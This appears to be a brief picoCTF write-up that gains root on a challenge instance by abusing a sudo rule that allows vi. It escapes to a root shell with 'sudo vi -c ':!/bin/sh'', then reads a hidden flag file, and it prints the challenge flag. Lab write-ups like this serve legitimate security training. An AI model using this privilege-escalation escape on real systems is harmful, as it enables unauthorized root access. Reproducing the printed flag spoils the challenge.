- Login using ssh into the instance.
- Description says "Can you read files in the root file?".
- Let's change by running "cd ../.. " because and list contents of directory by "ls -la", we see that there is a root folder. When we try to access we are denied the
  access because we are not root user.
- We can heck our permissions by running "sudo -l". We see that we can run vi as root on any file. Read more: https://gtfobins.github.io/gtfobins/vi/#sudo.
- Run "sudo /usr/bin/vi -c ':!/bin/sh' /dev/nul". Now we have root access and we can check that by running "whoami".
- Now lets access the root folder and list the contents by "ls -la", we see there is file name .flag.txt.
- Run "cat .flag.txt" and we'll get our flag.
- <details> 
  <summary>Flag</summary>
   picoCTF{uS1ng_v1m_3dit0r_55878b51}
  </details>
